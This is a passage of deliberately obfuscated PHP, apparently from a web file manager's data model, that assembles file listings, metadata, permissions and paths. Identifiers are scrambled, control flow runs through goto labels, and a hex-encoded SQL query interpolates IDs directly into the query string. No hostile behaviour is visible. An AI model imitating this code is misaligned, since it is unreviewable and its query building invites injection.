goto aª¨Ê…«¦È; e„Öò‹î¨: } protected function _makeOrder() { goto b Åè„‹—‡; E„³‡”Ãô¬: if ($B³›œ÷Ê±“ == $cÜ·ÌôÉ÷×[28]) { } $Aé†‚ÀôÈ = $cÜ·ÌôÉ÷×[405] . $DİÖˆÃÓßÀ[$B³›œ÷Ê±“] . $cÜ·ÌôÉ÷×[50] . $cˆæÕ´«¾[$fÒ­Ğ÷°³‘]; return $this->order(rtrim(trim($Aé†‚ÀôÈ), $cÜ·ÌôÉ÷×[47])); goto a©ËŠšáÛË; Fíîç«¢œ–: $cˆæÕ´«¾ = array($cÜ·ÌôÉ÷×[398] => $cÜ·ÌôÉ÷×[399], $cÜ·ÌôÉ÷×[400] => $cÜ·ÌôÉ÷×[401]); $DİÖˆÃÓßÀ = array($cÜ·ÌôÉ÷×[28] => $cÜ·ÌôÉ÷×[28], $cÜ·ÌôÉ÷×[77] => $cÜ·ÌôÉ÷×[77], $cÜ·ÌôÉ÷×[157] => $cÜ·ÌôÉ÷×[369], $cÜ·ÌôÉ÷×[375] => $cÜ·ÌôÉ÷×[375], $cÜ·ÌôÉ÷×[402] => $cÜ·ÌôÉ÷×[376], $cÜ·ÌôÉ÷×[184] => $cÜ·ÌôÉ÷×[184], $cÜ·ÌôÉ÷×[107] => $cÜ·ÌôÉ÷×[107]); $B³›œ÷Ê±“ = Input::get($cÜ·ÌôÉ÷×[403], $cÜ·ÌôÉ÷×[7], $c®ªÔÌöò, array_keys($DİÖˆÃÓßÀ)); goto D¤Ä°¼ù¬; b Åè„‹—‡: $cÜ·ÌôÉ÷× =& $_SERVER[£ü]; $c®ªÔÌöò = Model($cÜ·ÌôÉ÷×[395])->get($cÜ·ÌôÉ÷×[396]); $d˜¸éÈöÓ = Model($cÜ·ÌôÉ÷×[395])->get($cÜ·ÌôÉ÷×[397]); goto Fíîç«¢œ–; D¤Ä°¼ù¬: $fÒ­Ğ÷°³‘ = Input::get($cÜ·ÌôÉ÷×[404], $cÜ·ÌôÉ÷×[7], $d˜¸éÈöÓ, array_keys($cˆæÕ´«¾)); if (!in_array($B³›œ÷Ê±“, array_keys($DİÖˆÃÓßÀ))) { $B³›œ÷Ê±“ = $cÜ·ÌôÉ÷×[28]; } if (!in_array($fÒ­Ğ÷°³‘, array_keys($cˆæÕ´«¾))) { $B³›œ÷Ê±“ = $cÜ·ÌôÉ÷×[398]; } goto E„³‡”Ãô¬; a©ËŠšáÛË: } protected function _listDataApplyItem($A¿šôãÒõ¡, $b™Á²£†‹Ò = false) { $cğ¦Ä¬ïñä = array($A¿šôãÒõ¡); $this->_listDataApply($cğ¦Ä¬ïñä, $b™Á²£†‹Ò); return $cğ¦Ä¬ïñä[0]; } protected function _listDataApply(&$C°×”ÕÉ“, $CÃ˜‰õ«ƒŠ = false) { goto F•ù©Ãœ‚; F•ù©Ãœ‚: $dÖœèÉÙË =& $_SERVER[£ü]; if (!$C°×”ÕÉ“) { $C°×”ÕÉ“ = array(); return; } $d¸çµ”¾ = array_to_keyvalue($C°×”ÕÉ“, $dÖœèÉÙË[33], $dÖœèÉÙË[366]); goto E×›òìØŠé; a”š–ë¯˜: $this->_listAppendPath($C°×”ÕÉ“); $this->_listAppendAuth($C°×”ÕÉ“); $this->_listAppendSourceInfo($C°×”ÕÉ“, $d¸çµ”¾); goto bêãß¸ËÒŸ; bêãß¸ËÒŸ: $this->_listAppendUser($C°×”ÕÉ“); $this->_listFilterInfo($C°×”ÕÉ“, $CÃ˜‰õ«ƒŠ); goto añ²éŠ›èˆ; E×›òìØŠé: $d¸çµ”¾ = array_unique($d¸çµ”¾); $this->_listSourceCache($C°×”ÕÉ“); if (!$CÃ˜‰õ«ƒŠ) { $this->_listAppendMeta($C°×”ÕÉ“, $d¸çµ”¾); $this->_listAppendFileMeta($C°×”ÕÉ“, $d¸çµ”¾); $this->_listAppendChildren($C°×”ÕÉ“, $d¸çµ”¾); } goto a”š–ë¯˜; añ²éŠ›èˆ: } protected function _listSourceCache($F¶Şæ¨µ) { $dÜ°Ÿ‡ãôï =& $_SERVER[£ü]; foreach ($F¶Şæ¨µ as $cÖïó§“Íò) { self::$cacheSourceInfo[$dÜ°Ÿ‡ãôï[406] . $cÖïó§“Íò[$dÜ°Ÿ‡ãôï[366]]] = $cÖïó§“Íò; } } protected function _listFilterInfo(&$d­Å©æó¸ˆ, $f‘¶¬ŠãáÅ = false) { $e¤‚º¸¼”ª =& $_SERVER[£ü]; foreach ($d­Å©æó¸ˆ as &$EèÛ‹«‘±) { $EèÛ‹«‘± = $this->pathInfoFilter($EèÛ‹«‘±); self::$cachePathInfo[$e¤‚º¸¼”ª[407] . intval($f‘¶¬ŠãáÅ) . $e¤‚º¸¼”ª[408] . $EèÛ‹«‘±[$e¤‚º¸¼”ª[366]]] = $EèÛ‹«‘±; } } protected function _listMake(&$Fë‘“øÙÄ¾) { $D‘ÕéôÆ›’ =& $_SERVER[£ü]; $Fë‘“øÙÄ¾[$D‘ÕéôÆ›’[74]] = array(); $Fë‘“øÙÄ¾[$D‘ÕéôÆ›’[73]] = array(); foreach ($Fë‘“øÙÄ¾[$D‘ÕéôÆ›’[351]] as $aĞÒ£ÇÏšÎ) { $a«ìÒƒ›áÎ = $aĞÒ£ÇÏšÎ[$D‘ÕéôÆ›’[367]] == 1 ? $D‘ÕéôÆ›’[74] : $D‘ÕéôÆ›’[73]; $Fë‘“øÙÄ¾[$a«ìÒƒ›áÎ][] = $aĞÒ£ÇÏšÎ; } unset($Fë‘“øÙÄ¾[$D‘ÕéôÆ›’[351]]); } protected function _listAppendMeta(&$fµÚ¿¯Ğ²İ, $EñêÉöÆˆ‡) { goto FÓªÛçÓ­’; a·¢Ò™¶Ôœ: if (!$dĞ„ôà¤ì) { return; } $bÂ²½î¦Åª = array($BÕ®îƒÕËÉ[411], $BÕ®îƒÕËÉ[412]); $bÍØªÎÈÍ‰ = array(); goto A¦â‰Ç‘à®; FÓªÛçÓ­’: $BÕ®îƒÕËÉ =& $_SERVER[£ü]; $eÈçØÇƒÂ = array($BÕ®îƒÕËÉ[380] => array($BÕ®îƒÕËÉ[381], $EñêÉöÆˆ‡)); $dĞ„ôà¤ì = Model($BÕ®îƒÕËÉ[409])->field($BÕ®îƒÕËÉ[410])->where($eÈçØÇƒÂ)->select(); goto a·¢Ò™¶Ôœ; A¦â‰Ç‘à®: foreach ($dĞ„ôà¤ì as $cë¨‹¨ä) { if (!isset($bÍØªÎÈÍ‰[$cë¨‹¨ä[$BÕ®îƒÕËÉ[366]]])) { $bÍØªÎÈÍ‰[$cë¨‹¨ä[$BÕ®îƒÕËÉ[366]]] = array(); } if (in_array($cë¨‹¨ä[$BÕ®îƒÕËÉ[89]], $bÂ²½î¦Åª)) { continue; } $bÍØªÎÈÍ‰[$cë¨‹¨ä[$BÕ®îƒÕËÉ[366]]][$cë¨‹¨ä[$BÕ®îƒÕËÉ[89]]] = $cë¨‹¨ä[$BÕ®îƒÕËÉ[356]]; } foreach ($fµÚ¿¯Ğ²İ as &$dºé¥¿Ú·î) { $dºé¥¿Ú·î[$BÕ®îƒÕËÉ[413]] = !1; if (isset($bÍØªÎÈÍ‰[$dºé¥¿Ú·î[$BÕ®îƒÕËÉ[366]]])) { $dºé¥¿Ú·î[$BÕ®îƒÕËÉ[413]] = $bÍØªÎÈÍ‰[$dºé¥¿Ú·î[$BÕ®îƒÕËÉ[366]]]; } if ($this->fileIsLock($dºé¥¿Ú·î) && $dºé¥¿Ú·î[$BÕ®îƒÕËÉ[373]]) { $b³¿¶‹Üáï = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $dºé¥¿Ú·î[$BÕ®îƒÕËÉ[373]][$BÕ®îƒÕËÉ[374]] = AuthModel::authDisable($dºé¥¿Ú·î[$BÕ®îƒÕËÉ[373]][$BÕ®îƒÕËÉ[374]], $b³¿¶‹Üáï); $dºé¥¿Ú·î[$BÕ®îƒÕËÉ[373]][$BÕ®îƒÕËÉ[414]][$BÕ®îƒÕËÉ[373]] = $dºé¥¿Ú·î[$BÕ®îƒÕËÉ[373]][$BÕ®îƒÕËÉ[374]]; } } goto cœ„¥ËˆÏ‹; cœ„¥ËˆÏ‹: } protected function _listAppendFileMeta(&$Fó´ç“èŒ», $eÛé°¦¤×Æ) { goto eÂ™‹¡Ò˜Ä; B²¤òÉæ: if (!$b®à”ğÑâí) { return; } $f¦‹‘Ğ©¶ì = array($DÇ×Ï’Ì©Ö[416] => array($DÇ×Ï’Ì©Ö[381], $b®à”ğÑâí)); $bƒİÁ™†  = $DÇ×Ï’Ì©Ö[417]; goto cëÀó™æ ; cëÀó™æ : $cˆäàŸ‚µø = Model($DÇ×Ï’Ì©Ö[418])->field($bƒİÁ™† )->where($f¦‹‘Ğ©¶ì)->select(); $cˆäàŸ‚µø = array_to_keyvalue($cˆäàŸ‚µø, $DÇ×Ï’Ì©Ö[415]); $C¹‰Ë²ŠÃ = Model($DÇ×Ï’Ì©Ö[419])->field($DÇ×Ï’Ì©Ö[420])->where($f¦‹‘Ğ©¶ì)->select(); goto eçÇ¼ªÂÙ…; eÂ™‹¡Ò˜Ä: $DÇ×Ï’Ì©Ö =& $_SERVER[£ü]; $b®à”ğÑâí = array_to_keyvalue($Fó´ç“èŒ», $DÇ×Ï’Ì©Ö[33], $DÇ×Ï’Ì©Ö[415]); $b®à”ğÑâí = array_filter(array_unique($b®à”ğÑâí)); goto B²¤òÉæ; B‚ÎÎáµ÷­: foreach ($Fó´ç“èŒ» as &$dÄ™äõ¥¢) { goto FÇğèãªÏ; C×Ê’¢‚ƒ: $Aé³¼Ó©È[$DÇ×Ï’Ì©Ö[77]] = $dÄ™äõ¥¢[$DÇ×Ï’Ì©Ö[77]]; $Aé³¼Ó©È[$DÇ×Ï’Ì©Ö[28]] = $dÄ™äõ¥¢[$DÇ×Ï’Ì©Ö[28]]; self::$cacheFileInfo[$DÇ×Ï’Ì©Ö[421] . $AéÜŒŞàË—] = $Aé³¼Ó©È; goto D‹íŒ³ƒ®; FÇğèãªÏ: $AéÜŒŞàË— = $dÄ™äõ¥¢[$DÇ×Ï’Ì©Ö[415]]; if (!$AéÜŒŞàË— || !isset($cˆäàŸ‚µø[$AéÜŒŞàË—])) { continue; } $Aé³¼Ó©È = $cˆäàŸ‚µø[$AéÜŒŞàË—]; goto C×Ê’¢‚ƒ; CŞ·¥·’Ñ¥: if (isset($dÄ™äõ¥¢[$DÇ×Ï’Ì©Ö[159]][$DÇ×Ï’Ì©Ö[422]])) { $dÄ™äõ¥¢[$DÇ×Ï’Ì©Ö[422]] = json_decode($dÄ™äõ¥¢[$DÇ×Ï’Ì©Ö[159]][$DÇ×Ï’Ì©Ö[422]], !0); unset($dÄ™äõ¥¢[$DÇ×Ï’Ì©Ö[159]][$DÇ×Ï’Ì©Ö[422]]); } goto a©Öäæ°›Œ; D‹íŒ³ƒ®: unset($cˆäàŸ‚µø[$AéÜŒŞàË—][$DÇ×Ï’Ì©Ö[75]]); $a—Ï¹Ÿã˜Ş = is_array($aŸöÏ¯íğ¾[$AéÜŒŞàË—]) ? $aŸöÏ¯íğ¾[$AéÜŒŞàË—] : array(); $dÄ™äõ¥¢[$DÇ×Ï’Ì©Ö[159]] = array_merge($a—Ï¹Ÿã˜Ş, $cˆäàŸ‚µø[$AéÜŒŞàË—]); goto CŞ·¥·’Ñ¥; a©Öäæ°›Œ: } goto Aœ£¬õà««; eçÇ¼ªÂÙ…: $C¹‰Ë²ŠÃ = $C¹‰Ë²ŠÃ ? $C¹‰Ë²ŠÃ : array(); $aŸöÏ¯íğ¾ = array(); foreach ($C¹‰Ë²ŠÃ as $aØ¯Å»£Ú) { if (!isset($aŸöÏ¯íğ¾[$aØ¯Å»£Ú[$DÇ×Ï’Ì©Ö[415]]])) { $aŸöÏ¯íğ¾[$aØ¯Å»£Ú[$DÇ×Ï’Ì©Ö[415]]] = array(); } $aŸöÏ¯íğ¾[$aØ¯Å»£Ú[$DÇ×Ï’Ì©Ö[415]]][$aØ¯Å»£Ú[$DÇ×Ï’Ì©Ö[89]]] = $aØ¯Å»£Ú[$DÇ×Ï’Ì©Ö[356]]; } goto B‚ÎÎáµ÷­; Aœ£¬õà««: } protected function _listAppendSourceInfo(&$bÜ£˜¿–‚, $cÊ›Î©Ğ‰) { goto a¾Úßæ²º; CÎëªÀºã–: $aªí²Í½¨ = array_to_keyvalue_group($fÕ‘…™, $CƒÆèöÇåÜ[366]); foreach ($bÜ£˜¿–‚ as &$AßÃœÃæŞ) { $AßÃœÃæŞ[$CƒÆèöÇåÜ[388]] = array($CƒÆèöÇåÜ[426] => 0, $CƒÆèöÇåÜ[427] => 0, $CƒÆèöÇåÜ[428] => 0); if (isset($e„ÒŒ˜êê‡[$AßÃœÃæŞ[$CƒÆèöÇåÜ[366]]])) { $AßÃœÃæŞ[$CƒÆèöÇåÜ[388]][$CƒÆèöÇåÜ[429]] = 1; $AßÃœÃæŞ[$CƒÆèöÇåÜ[388]][$CƒÆèöÇåÜ[430]] = $e„ÒŒ˜êê‡[$AßÃœÃæŞ[$CƒÆèöÇåÜ[366]]][$CƒÆèöÇåÜ[28]]; } if (isset($EˆÉ‚“ìÈ[$AßÃœÃæŞ[$CƒÆèöÇåÜ[366]]])) { $AßÃœÃæŞ[$CƒÆèöÇåÜ[388]][$CƒÆèöÇåÜ[431]] = array(); foreach ($EˆÉ‚“ìÈ[$AßÃœÃæŞ[$CƒÆèöÇåÜ[366]]] as $eÊÜ¿æªò») { $C©ì°­¢”ï = $d­ŒØ­í›µ[$eÊÜ¿æªò»]; $AßÃœÃæŞ[$CƒÆèöÇåÜ[388]][$CƒÆèöÇåÜ[431]][] = array($CƒÆèöÇåÜ[432] => $C©ì°­¢”ï[$CƒÆèöÇåÜ[364]], $CƒÆèöÇåÜ[383] => $C©ì°­¢”ï[$CƒÆèöÇåÜ[28]], $CƒÆèöÇåÜ[433] => $C©ì°­¢”ï[$CƒÆèöÇåÜ[434]]); } } if (isset($aªí²Í½¨[$AßÃœÃæŞ[$CƒÆèöÇåÜ[366]]])) { $AßÃœÃæŞ[$CƒÆèöÇåÜ[388]][$CƒÆèöÇåÜ[435]] = array(); foreach ($aªí²Í½¨[$AßÃœÃæŞ[$CƒÆèöÇåÜ[366]]] as $a¦Ã¨‹Æ”) { $AßÃœÃæŞ[$CƒÆèöÇåÜ[388]][$CƒÆèöÇåÜ[435]] = array($CƒÆèöÇåÜ[436] => $a¦Ã¨‹Æ”[$CƒÆèöÇåÜ[437]], $CƒÆèöÇåÜ[438] => $a¦Ã¨‹Æ”[$CƒÆèöÇåÜ[439]], $CƒÆèöÇåÜ[440] => $a¦Ã¨‹Æ”[$CƒÆèöÇåÜ[366]], $CƒÆèöÇåÜ[441] => $a¦Ã¨‹Æ”[$CƒÆèöÇåÜ[442]], $CƒÆèöÇåÜ[443] => $a¦Ã¨‹Æ”[$CƒÆèöÇåÜ[444]]); } } } return $bÜ£˜¿–‚; goto EÇÖ²Èğò; c–×§‹ºÈ¦: $a‹Õ×¸Çå = Model($CƒÆèöÇåÜ[389])->listData(); $AÌ‹ÆîÏ¯ô = Model($CƒÆèöÇåÜ[378])->listData(); $fÕ‘…™ = Model($CƒÆèöÇåÜ[425])->listSimple(); goto Aƒ«‚—Šæ; a¾Úßæ²º: $CƒÆèöÇåÜ =& $_SERVER[£ü]; if (!defined($CƒÆèöÇåÜ[423])) { return; } $E­™µ¾½¿ = Model($CƒÆèöÇåÜ[424])->listData(); goto c–×§‹ºÈ¦; Aƒ«‚—Šæ: $d­ŒØ­í›µ = array_to_keyvalue($E­™µ¾½¿, $CƒÆèöÇåÜ[364]); $EˆÉ‚“ìÈ = array_to_keyvalue_group($a‹Õ×¸Çå, $CƒÆèöÇåÜ[75], $CƒÆèöÇåÜ[390]); $e„ÒŒ˜êê‡ = array_to_keyvalue($AÌ‹ÆîÏ¯ô, $CƒÆèöÇåÜ[75]); goto CÎëªÀºã–; EÇÖ²Èğò: } protected function _listAppendChildren(&$fœø†ŠË¬‰, $cïËï®«é) { goto CÃƒËÑŒÒà; Dää»ˆëøç: $CÏÇŒÄ‰À = $this->tablePrefix . $this->tableName; for ($b†¢éåĞ = 0; $b†¢éåĞ < $cõ¸¤èÈİ›; $b†¢éåĞ++) { $Dç¿¯¯Õ = intval($fœø†ŠË¬‰[$b†¢éåĞ][$cµî³òøãâ[393]]); if ($fœø†ŠË¬‰[$b†¢éåĞ][$cµî³òøãâ[367]]) { $Fùí–šõ˜ = $fœø†ŠË¬‰[$b†¢éåĞ][$cµî³òøãâ[366]]; $BîöˆË .= "\x53\105\x4c\x45\103\124\x20\x2a\40\x46\x52\117\x4d\x20\50\x53\x45\x4c\105\x43\x54\x20\47{$Fùí–šõ˜}\137\x68\x61\163\x46\x69\x6c\x65\47\x20\x61\163\x20\x68\141\163\x2c\x63\157\165\156\164\50\x31\x29\40\x61\x73\x20\150\141\163\x43\x6f\165\x6e\x74\40\x46\122\x4f\115\40\x60{$CÏÇŒÄ‰À}\x60\40\xa\11\11\x9\11\x9\167\x68\145\x72\x65\40\160\141\162\x65\x6e\164\x49\x44\x3d{$Fùí–šõ˜}\40\141\x6e\144\x20\151\163\106\157\x6c\144\145\162\x3d\60\x20\x61\156\x64\40\x69\163\104\145\x6c\145\x74\x65\x3d{$Dç¿¯¯Õ}\51\x20\141\x73\40\164\x62\61\x5f{$Fùí–šõ˜}\40\x75\156\x69\x6f\156\x20\x61\154\154\x20\12\x9\x9\11\11\11\123\105\114\x45\x43\124\40\x2a\x20\106\x52\117\115\40\x28\123\x45\x4c\105\x43\124\40\x27{$Fùí–šõ˜}\137\x68\141\163\x46\x6f\154\144\x65\162\47\x20\x61\163\40\150\x61\163\x46\151\154\145\x2c\x63\157\165\156\x74\50\x31\51\40\x61\x73\40\150\x61\x73\103\157\x75\156\x74\40\x46\122\117\115\40\x60{$CÏÇŒÄ‰À}\x60\x20\12\x9\11\11\11\11\167\x68\x65\x72\145\40\160\x61\162\145\x6e\164\x49\104\x3d{$Fùí–šõ˜}\x20\x61\156\x64\40\151\163\106\x6f\154\x64\x65\x72\75\61\x20\141\x6e\144\40\x69\163\104\x65\154\145\164\145\75{$Dç¿¯¯Õ}\x29\x20\x61\163\x20\x74\x62\x32\x5f{$Fùí–šõ˜}\x20\x75\156\151\x6f\x6e\x20\x61\x6c\154\40"; } if ((strlen($BîöˆË) >= $cââ›À || $b†¢éåĞ == $cõ¸¤èÈİ› - 1) && $BîöˆË) { $BîöˆË = substr($BîöˆË, 0, -strlen($cµî³òøãâ[445])); $Fã•ƒÁ’×Á = $this->query($BîöˆË); $F§‹ÉŠ®Ëœ = array_merge($F§‹ÉŠ®Ëœ, $Fã•ƒÁ’×Á); $BîöˆË = $cµî³òøãâ[33]; } } $F§‹ÉŠ®Ëœ = array_to_keyvalue($F§‹ÉŠ®Ëœ, $cµî³òøãâ[446]); goto CŸ¿Ğ…ƒğ¦; CŸ¿Ğ…ƒğ¦: foreach ($fœø†ŠË¬‰ as &$AÊ†£¢ÒÕƒ) { if ($AÊ†£¢ÒÕƒ[$cµî³òøãâ[367]]) { unset($AÊ†£¢ÒÕƒ[$cµî³òøãâ[369]]); $AÊ†£¢ÒÕƒ[$cµî³òøãâ[189]] = intval($F§‹ÉŠ®Ëœ[$AÊ†£¢ÒÕƒ[$cµî³òøãâ[366]] . $cµî³òøãâ[447]][$cµî³òøãâ[448]]); $AÊ†£¢ÒÕƒ[$cµî³òøãâ[188]] = intval($F§‹ÉŠ®Ëœ[$AÊ†£¢ÒÕƒ[$cµî³òøãâ[366]] . $cµî³òøãâ[449]][$cµî³òøãâ[448]]); } } goto b¢•´±¢¡; CÃƒËÑŒÒà: $cµî³òøãâ =& $_SERVER[£ü]; $BîöˆË = $cµî³òøãâ[358]; $F§‹ÉŠ®Ëœ = array(); goto b•šĞ‡“ñò; b•šĞ‡“ñò: $cââ›À = 1024 * 50; $fœø†ŠË¬‰ = is_array($fœø†ŠË¬‰) ? $fœø†ŠË¬‰ : array(); $cõ¸¤èÈİ› = count($fœø†ŠË¬‰); goto Dää»ˆëøç; b¢•´±¢¡: } protected function _listAppendAuth(&$eâ­¼èŒÂ) { goto eöé±Ê˜©; A¥ÄŸß‚¨: $EÁŠ¹Ã†™Ğ = Model($dÄ…¤²¶á›[450])->getSourceList($e”¬ç¼«¦, $D†Í ªõÌ«); foreach ($eâ­¼èŒÂ as $f­Ú¤ »÷ => &$eùçÃ÷íóŸ) { $eùçÃ÷íóŸ[$dÄ…¤²¶á›[373]] = $EÁŠ¹Ã†™Ğ[$eùçÃ÷íóŸ[$dÄ…¤²¶á›[366]]]; if (!$eùçÃ÷íóŸ[$dÄ…¤²¶á›[373]] && $eùçÃ÷íóŸ[$dÄ…¤²¶á›[368]] == self::TYPE_GROUP) { $eùçÃ÷íóŸ[$dÄ…¤²¶á›[373]] = Action($dÄ…¤²¶á›[451])->pathGroupAuthMake($eùçÃ÷íóŸ[$dÄ…¤²¶á›[452]]); if (!$eùçÃ÷íóŸ[$dÄ…¤²¶á›[373]] && !_get($GLOBALS, $dÄ…¤²¶á›[453])) { $eùçÃ÷íóŸ[$dÄ…¤²¶á›[186]] = !1; $eùçÃ÷íóŸ[$dÄ…¤²¶á›[185]] = !1; } } if ($eùçÃ÷íóŸ[$dÄ…¤²¶á›[373]]) { $eùçÃ÷íóŸ[$dÄ…¤²¶á›[186]] = AuthModel::authCheckEdit($eùçÃ÷íóŸ[$dÄ…¤²¶á›[373]][$dÄ…¤²¶á›[374]]); $eùçÃ÷íóŸ[$dÄ…¤²¶á›[185]] = AuthModel::authCheckView($eùçÃ÷íóŸ[$dÄ…¤²¶á›[373]][$dÄ…¤²¶á›[374]]); } $this->groupPathDisplay($eùçÃ÷íóŸ); } goto fĞùŒ¡ôò; eöé±Ê˜©: $dÄ…¤²¶á› =& $_SERVER[£ü]; if (!defined($dÄ…¤²¶á›[423])) { return; } $e”¬ç¼«¦ = array(); goto e¸Ê«ä½òÒ; e¸Ê«ä½òÒ: foreach ($eâ­¼èŒÂ as $eùçÃ÷íóŸ) { if ($eùçÃ÷íóŸ[$dÄ…¤²¶á›[368]] == self::TYPE_GROUP) { $e”¬ç¼«¦[] = $eùçÃ÷íóŸ[$dÄ…¤²¶á›[366]]; } } if (!$e”¬ç¼«¦) { return; } $D†Í ªõÌ« = array_to_keyvalue($eâ­¼èŒÂ, $dÄ…¤²¶á›[366]); goto A¥ÄŸß‚¨; fĞùŒ¡ôò: } public function groupPathDisplay(&$c›‡Şç¹‡ğ) { goto Eå±¼Æ¥ÄØ; AÛÈí¶”ÔŞ: $c›‡Şç¹‡ğ[$eæÎä¾¥Š[460]] = $C¾îÒ¤ìªˆ . $DÉ‘æŒ‡ˆ[$eæÎä¾¥Š[388]][$eæÎä¾¥Š[366]]; goto F‹·Ö­ÅÌ ; Eå±¼Æ¥ÄØ: $eæÎä¾¥Š =& $_SERVER[£ü]; if ($c›‡Şç¹‡ğ[$eæÎä¾¥Š[368]] != self::TYPE_GROUP) { return; } $DÉ‘æŒ‡ˆ = Model($eæÎä¾¥Š[454])->getInfo($c›‡Şç¹‡ğ[$eæÎä¾¥Š[452]]); goto CÅòù¿Şó; F’Î¡…í: $c›‡Şç¹‡ğ[$eæÎä¾¥Š[456]] = $DÉ‘æŒ‡ˆ[$eæÎä¾¥Š[457]]; $c›‡Şç¹‡ğ[$eæÎä¾¥Š[377]] = $DÉ‘æŒ‡ˆ[$eæÎä¾¥Š[455]]; $c›‡Şç¹‡ğ[$eæÎä¾¥Š[458]] = $DÉ‘æŒ‡ˆ[$eæÎä¾¥Š[459]]; goto AÛÈí¶”ÔŞ; CÅòù¿Şó: $D®æßšë÷‹ = $this->parentLevelArray($DÉ‘æŒ‡ˆ[$eæÎä¾¥Š[455]]); $C¾îÒ¤ìªˆ = $eæÎä¾¥Š[33]; foreach ($D®æßšë÷‹ as $C¥´¦¼–»Ø) { $CÇëÃ®÷áŠ = Model($eæÎä¾¥Š[454])->getInfo($C¥´¦¼–»Ø); $C¾îÒ¤ìªˆ .= $CÇëÃ®÷áŠ[$eæÎä¾¥Š[388]][$eæÎä¾¥Š[366]] . $eæÎä¾¥Š[47]; } goto F’Î¡…í; F‹·Ö­ÅÌ : } protected function _listAppendPath(&$bˆ™¹Ê¾¾À) { goto A‘ÑÍ’Ä¢; A‘ÑÍ’Ä¢: $fº„õ®„½¦ =& $_SERVER[£ü]; $D¹š¡ŸÒó = array(); foreach ($bˆ™¹Ê¾¾À as &$D¹‚Í”£œ¦) { $D¹š¡ŸÒó[$D¹‚Í”£œ¦[$fº„õ®„½¦[366]]] = $D¹‚Í”£œ¦[$fº„õ®„½¦[28]]; $fßÈª¢ÁÔ = $this->parentLevelArray($D¹‚Í”£œ¦[$fº„õ®„½¦[455]]); array_shift($fßÈª¢ÁÔ); foreach ($fßÈª¢ÁÔ as $B¾Î‹ñ½ìÈ) { if (!isset($D¹š¡ŸÒó[$B¾Î‹ñ½ìÈ])) { $D¹š¡ŸÒó[$B¾Î‹ñ½ìÈ] = 0; } } } goto fÎ…¹¥Êª; fÎ…¹¥Êª: $Cİ–ÌÖÒˆŠ = array(); foreach ($D¹š¡ŸÒó as $C´èñÑ„İ => $Cº ØõÜ“í) { if (!$Cº ØõÜ“í) { $Cİ–ÌÖÒˆŠ[] = $C´èñÑ„İ; } } if ($Cİ–ÌÖÒˆŠ) { $bË‹¦…Ã£Ş = array($fº„õ®„½¦[380] => array($fº„õ®„½¦[381], $Cİ–ÌÖÒˆŠ)); if (count($Cİ–ÌÖÒˆŠ) == 1) { $cëÀŞŸº•‰ = $this->sourceInfo($Cİ–ÌÖÒˆŠ[0]); $cëÀŞŸº•‰ = is_array($cëÀŞŸº•‰) ? array($cëÀŞŸº•‰) : !1; } else { $cëÀŞŸº•‰ = $this->field($fº„õ®„½¦[461])->where($bË‹¦…Ã£Ş)->select(); } $C“ÛœÍ³‡ = array_to_keyvalue($cëÀŞŸº•‰, $fº„õ®„½¦[366], $fº„õ®„½¦[28]); $D¹š¡ŸÒó = array_merge_index($D¹š¡ŸÒó, $C“ÛœÍ³‡); } goto c’ÆÕ£íŞ‰; c’ÆÕ£íŞ‰: $cªØåœ´Î‡ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($bˆ™¹Ê¾¾À as &$D¹‚Í”£œ¦) { goto f‘İŒÊ¿Ó; aø âº²ß: $A‡¶æÁ´“ = trim($D¹‚Í”£œ¦[$fº„õ®„½¦[462]], $fº„õ®„½¦[8]); if ($D¹‚Í”£œ¦[$fº„õ®„½¦[457]] == $fº„õ®„½¦[464] && $A‡¶æÁ´“) { $D¹‚Í”£œ¦[$fº„õ®„½¦[28]] = $A‡¶æÁ´“; } $this->_listAppendPathRecycle($D¹‚Í”£œ¦, $fßÈª¢ÁÔ, $cªØåœ´Î‡); goto b‰À‡÷í•¡; dÂ·îß¬ß: if ($fßÈª¢ÁÔ) { $fãÁö‘ÕˆÔ .= $D¹‚Í”£œ¦[$fº„õ®„½¦[28]]; } if ($D¹‚Í”£œ¦[$fº„õ®„½¦[367]]) { $fãÁö‘ÕˆÔ .= $fº„õ®„½¦[8]; } $D¹‚Í”£œ¦[$fº„õ®„½¦[462]] = str_replace($fº„õ®„½¦[463], $fº„õ®„½¦[8], $fãÁö‘ÕˆÔ); goto aø âº²ß; f‘İŒÊ¿Ó: $fßÈª¢ÁÔ = $this->parentLevelArray($D¹‚Í”£œ¦[$fº„õ®„½¦[455]]); $fãÁö‘ÕˆÔ = $this->_listAppendPathRoot($D¹‚Í”£œ¦, $fßÈª¢ÁÔ); foreach ($fßÈª¢ÁÔ as $B¾Î‹ñ½ìÈ) { if (isset($D¹š¡ŸÒó[$B¾Î‹ñ½ìÈ])) { $fãÁö‘ÕˆÔ .= $D¹š¡ŸÒó[$B¾Î‹ñ½ìÈ] . $fº„õ®„½¦[8]; } } goto dÂ·îß¬ß; b‰À‡÷í•¡: } goto FóÔ‚Õ•«; FóÔ‚Õ•«: } private function _listAppendPathRecycle(&$B„Ã‡ŸŠ, $AŒÃÅ˜ÓõŒ, $CíŸ·š©Ì) { goto EÌ¹Œ·Èá¤; EÌ¹Œ·Èá¤: $B“éƒ¨‚¸ =& $_SERVER[£ü]; if (intval($B„Ã‡ŸŠ[$B“éƒ¨‚¸[368]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($CíŸ·š©Ì, $AŒÃÅ˜ÓõŒ) && $B„Ã‡ŸŠ[$B“éƒ¨‚¸[366]] != $CíŸ·š©Ì) { return; } goto C©¾Æ¡¾ìˆ; CëºÆ‰òÕç: $B„Ã‡ŸŠ[$B“éƒ¨‚¸[455]] = $B“éƒ¨‚¸[466] . implode($B“éƒ¨‚¸[47], array_slice($AŒÃÅ˜ÓõŒ, 1)) . $B“éƒ¨‚¸[47]; if ($B„Ã‡ŸŠ[$B“éƒ¨‚¸[366]] == $CíŸ·š©Ì) { $B„Ã‡ŸŠ[$B“éƒ¨‚¸[455]] = $B“éƒ¨‚¸[466]; $B„Ã‡ŸŠ[$B“éƒ¨‚¸[457]] = $B“éƒ¨‚¸[464]; $B„Ã‡ŸŠ[$B“éƒ¨‚¸[28]] = LNG($B“éƒ¨‚¸[465]); } $B„Ã‡ŸŠ[$B“éƒ¨‚¸[467]] = $B“éƒ¨‚¸[468]; goto a‹—¯Ô¯™; C©¾Æ¡¾ìˆ: $a¡â‹ÎàÈ¦ = explode($B“éƒ¨‚¸[8], trim($B„Ã‡ŸŠ[$B“éƒ¨‚¸[462]], $B“éƒ¨‚¸[8])); $E‚Œ»†ÎÑô = implode($B“éƒ¨‚¸[8], 